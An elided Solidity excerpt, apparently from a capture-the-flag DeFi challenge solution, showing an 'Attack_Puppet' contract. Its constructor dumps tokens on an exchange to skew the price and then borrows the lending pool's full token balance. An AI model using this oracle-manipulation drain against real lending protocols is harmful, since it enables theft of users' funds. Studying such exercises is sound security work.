...
contract Attack_Puppet{
    ...
    constructor(address _pool, address _exchange, address _token, uint8 v, bytes32 r, bytes32 s) payable
    {
        ...
        token.approve(address(exchange), token.balanceOf(msg.sender));
        exchange.tokenToEthSwapInput(token.balanceOf(msg.sender), 1, block.timestamp + 42069);

        //Lend out all the tokens
        pool.borrow(token.balanceOf(_pool), msg.sender);
    }
}